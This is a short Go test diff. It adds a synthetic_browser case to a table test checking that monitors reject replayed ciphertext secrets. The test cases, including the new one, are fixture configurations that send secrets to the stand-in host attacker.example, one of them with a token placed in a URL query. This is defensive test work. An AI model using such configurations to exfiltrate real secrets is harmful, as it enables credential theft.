@@ -83,6 +83,7 @@ func TestTestMonitorRejectsCiphertextReplayWithoutSavedID(t *testing.T) {
 		{"http", map[string]any{"url": "https://attacker.example", "method": "GET", "secret_headers": map[string]string{"Authorization": `{"alg":"aes-256-gcm","ct":"replayed-ciphertext"}`}}},
 		{"http", map[string]any{"url": "https://attacker.example", "method": "GET", "basic_auth_username": "u", "basic_auth_password": `{"alg":"aes-256-gcm","ct":"replayed-ciphertext"}`}},
 		{"grpc", map[string]any{"host": "attacker.example", "secret_metadata": map[string]string{"authorization": `{"alg":"aes-256-gcm","ct":"replayed-ciphertext"}`}}},
+		{"synthetic_browser", map[string]any{"start_url": "https://attacker.example", "secret_variables": map[string]string{"password": `{"alg":"aes-256-gcm","ct":"replayed-ciphertext"}`}, "steps": []map[string]any{{"id": "a", "action": "goto", "url": "https://attacker.example"}}}},
 		{"synthetic_api", map[string]any{"secret_variables": map[string]string{"token": `{"alg":"aes-256-gcm","ct":"replayed-ciphertext"}`}, "steps": []map[string]any{{"id": "a", "request": map[string]any{"method": "GET", "url": "https://attacker.example/?t={{token}}"}}}}},
 	} {
 		t.Run(tc.monitorType, func(t *testing.T) {
